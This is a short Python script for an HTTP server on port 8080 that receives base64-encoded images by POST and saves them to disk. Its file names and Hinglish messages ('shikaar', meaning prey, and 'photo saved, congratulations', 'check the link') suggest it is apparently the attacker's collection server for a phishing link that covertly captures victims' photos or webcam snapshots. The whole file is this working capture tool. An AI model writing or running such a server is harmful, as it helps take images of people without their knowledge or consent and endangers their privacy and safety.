import http.server
import socketserver
import base64
import os
from datetime import datetime

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        if "image=" in post_data:
            try:
                img_data = post_data.split("base64,")[1]
                missing_padding = len(img_data) % 4
                if missing_padding:
                    img_data += '=' * (4 - missing_padding)
                filename = f"shikaar_{datetime.now().strftime('%H%M%S')}.png"
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(img_data))
                print(f"\n[+] MUBARAK HO! Photo save ho gayi: {filename}")
            except:
                print("\n[!] Error: Data adhura mila.")
        self.send_response(200)
        self.end_headers()

PORT = 8080
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Server chalu hai... Link check karo!")
    httpd.serve_forever()
